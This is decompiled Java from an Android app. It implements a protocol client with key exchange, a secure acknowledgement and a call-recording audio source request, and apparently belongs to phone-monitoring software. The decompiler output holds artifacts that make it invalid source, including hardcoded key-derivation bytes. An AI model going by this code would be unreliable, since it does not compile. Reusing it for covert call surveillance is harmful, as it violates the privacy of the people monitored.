package com.vvt.phoenix.prot.c;

import android.os.ConditionVariable;
import com.vvt.phoenix.exception.DataCorruptedException;
import com.vvt.phoenix.prot.a.g;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import javax.crypto.SecretKey;

public class e
{
  private com.vvt.http.a a;
  private String b;
  private byte[] c;
  private ByteArrayOutputStream d;
  private ConditionVariable e;
  private boolean f;
  private String g;
  private String h;
  private String i;
  private String j;
  
  public e(String paramString)
  {
    Object localObject = new android/os/ConditionVariable;
    ((ConditionVariable)localObject).<init>();
    this.e = ((ConditionVariable)localObject);
    localObject = new com/vvt/http/a;
    ((com.vvt.http.a)localObject).<init>();
    this.a = ((com.vvt.http.a)localObject);
    this.b = paramString;
  }
  
  public e(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    this(paramString1);
    this.h = paramString2;
    this.i = paramString3;
    this.j = paramString4;
  }
  
  private c a(String paramString)
  {
    c localc = new com/vvt/phoenix/prot/c/c;
    localc.<init>();
    localc.a(paramString);
    localc.a(false);
    return localc;
  }
  
  private void a()
  {
    try
    {
      ByteArrayOutputStream localByteArrayOutputStream = this.d;
      localByteArrayOutputStream.close();
      return;
    }
    catch (IOException localIOException)
    {
      for (;;) {}
    }
  }
  
  private a b(String paramString)
  {
    a locala = new com/vvt/phoenix/prot/c/a;
    locala.<init>();
    locala.a(paramString);
    locala.a(false);
    return locala;
  }
  
  private b c(String paramString)
  {
    b localb = new com/vvt/phoenix/prot/c/b;
    localb.<init>();
    localb.a(paramString);
    localb.a(false);
    return localb;
  }
  
  public a a(int paramInt, long paramLong)
  {
    int k = 1;
    Object localObject1 = g.a(paramInt, paramLong);
    this.c = ((byte[])localObject1);
    localObject1 = new com/vvt/phoenix/prot/c/f;
    int m = 101;
    ((f)localObject1).<init>(this, m);
    ((f)localObject1).setPriority(k);
    ((f)localObject1).start();
    localObject1 = this.e;
    long l = 240000L;
    boolean bool = ((ConditionVariable)localObject1).block(l);
    if (!bool)
    {
      this.e.close();
      localObject1 = b("Acknowledge Secure Error: Operation Time Out");
    }
    for (;;)
    {
      return (a)localObject1;
      localObject1 = this.e;
      ((ConditionVariable)localObject1).close();
      bool = this.f;
      Object localObject3;
      Object localObject4;
      if (!bool)
      {
        localObject3 = new Object[k];
        localObject4 = this.g;
        localObject3[0] = localObject4;
        localObject1 = String.format("Acknowledge Secure Error: %s", (Object[])localObject3);
        localObject1 = b((String)localObject1);
      }
      else
      {
        try
        {
          localObject1 = this.d;
          localObject1 = ((ByteArrayOutputStream)localObject1).toByteArray();
          localObject1 = g.a((byte[])localObject1);
          m = 1;
          ((a)localObject1).a(m);
          a();
        }
        catch (DataCorruptedException localDataCorruptedException)
        {
          localObject3 = "> doAckSecure # Data corrupted while parsing Acknowledge Secure response : \n%s";
          localObject4 = new Object[k];
          Object localObject2 = localDataCorruptedException.getMessage();
          localObject4[0] = localObject2;
          localObject2 = String.format((String)localObject3, (Object[])localObject4);
          localObject2 = b((String)localObject2);
        }
      }
    }
  }
  
  public b a(int paramInt1, int paramInt2, String paramString1, String paramString2, String paramString3, int paramInt3)
  {
    k = 1;
    try
    {
      localObject1 = g.a(paramInt1, paramInt2, paramString1, paramString2, paramString3, paramInt3);
      this.c = ((byte[])localObject1);
      localObject1 = new com/vvt/phoenix/prot/c/f;
      m = 104;
      ((f)localObject1).<init>(this, m);
      ((f)localObject1).setPriority(k);
      ((f)localObject1).start();
      localObject1 = this.e;
      long l = 240000L;
      bool = ((ConditionVariable)localObject1).block(l);
      if (bool) {
        break label141;
      }
      this.e.close();
      localObject1 = c("CallRecordingAudioSorce Error: Operation Time Out");
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        Object localObject1;
        int m;
        Object localObject4 = "> doGetCallRecordingAudioSorce # Data corrupted while parsing CallRecordingAudioSorce request : \n%s";
        Object localObject5 = new Object[k];
        Object localObject2 = localIOException.getMessage();
        localObject5[0] = localObject2;
        localObject2 = String.format((String)localObject4, (Object[])localObject5);
        localObject2 = c((String)localObject2);
        continue;
        localObject2 = this.e;
        ((ConditionVariable)localObject2).close();
        boolean bool = this.f;
        if (!bool)
        {
          localObject4 = new Object[k];
          localObject5 = this.g;
          localObject4[0] = localObject5;
          localObject2 = String.format("CallRecordingAudioSorce Error: %s", (Object[])localObject4);
          localObject2 = c((String)localObject2);
        }
        else
        {
          try
          {
            localObject2 = this.d;
            localObject2 = ((ByteArrayOutputStream)localObject2).toByteArray();
            localObject2 = g.b((byte[])localObject2);
            m = 1;
            ((b)localObject2).a(m);
            a();
          }
          catch (DataCorruptedException localDataCorruptedException)
          {
            localObject4 = "> doGetCallRecordingAudioSorce # Data corrupted while parsing CallRecordingAudioSorce response : \n%s";
            localObject5 = new Object[k];
            Object localObject3 = localDataCorruptedException.getMessage();
            localObject5[0] = localObject3;
            localObject3 = String.format((String)localObject4, (Object[])localObject5);
            localObject3 = c((String)localObject3);
          }
        }
      }
    }
    return (b)localObject1;
  }
  
  public c a(int paramInt1, int paramInt2)
  {
    int k = 10;
    int m = 1;
    Object localObject1 = com.vvt.l.e.a();
    Object localObject3 = ((SecretKey)localObject1).getEncoded();
    localObject3 = g.a(paramInt1, paramInt2, (byte[])localObject3);
    this.c = ((byte[])localObject3);
    localObject3 = new com/vvt/phoenix/prot/c/f;
    int n = 100;
    ((f)localObject3).<init>(this, n);
    ((f)localObject3).setPriority(m);
    ((f)localObject3).start();
    localObject3 = this.e;
    long l = 240000L;
    boolean bool = ((ConditionVariable)localObject3).block(l);
    if (!bool)
    {
      this.e.close();
      localObject1 = a("KeyExchange Error: Operation Time Out");
    }
    for (;;)
    {
      return (c)localObject1;
      localObject3 = this.e;
      ((ConditionVariable)localObject3).close();
      bool = this.f;
      Object localObject4;
      if (!bool)
      {
        localObject3 = new Object[m];
        localObject4 = this.g;
        localObject3[0] = localObject4;
        localObject1 = String.format("KeyExchange Error: %s", (Object[])localObject3);
        localObject1 = a((String)localObject1);
      }
      else
      {
        localObject3 = new byte[k];
        System.arraycopy(((SecretKey)localObject1).getEncoded(), 0, localObject3, 0, k);
        int i2 = localObject3.length + 6;
        localObject1 = ByteBuffer.allocate(i2);
        ((ByteBuffer)localObject1).put((byte[])localObject3);
        int i1 = 6;
        localObject3 = new byte[i1];
        Object tmp223_221 = localObject3;
        Object tmp224_223 = tmp223_221;
        Object tmp224_223 = tmp223_221;
        tmp224_223[0] = 10;
        tmp224_223[1] = 30;
        Object tmp233_224 = tmp224_223;
        Object tmp233_224 = tmp224_223;
        tmp233_224[2] = -103;
        tmp233_224[3] = 126;
        tmp233_224[4] = -68;
        tmp233_224[5] = -15;
        ((ByteBuffer)localObject1).put((byte[])localObject3);
        localObject1 = com.vvt.l.e.a(((ByteBuffer)localObject1).array());
        try
        {
          localObject3 = this.d;
          localObject3 = ((ByteArrayOutputStream)localObject3).toByteArray();
          localObject1 = g.a((byte[])localObject3, (SecretKey)localObject1);
          i1 = 1;
          ((c)localObject1).a(i1);
          a();
        }
        catch (DataCorruptedException localDataCorruptedException)
        {
          localObject3 = "> doKeyExchange # Data corrupted while parsing key exchange response : \n%s";
          localObject4 = new Object[m];
          Object localObject2 = localDataCorruptedException.getMessage();
          localObject4[0] = localObject2;
          localObject2 = String.format((String)localObject3, (Object[])localObject4);
          localObject2 = a((String)localObject2);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/MyUncaughtExceptionHandler/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */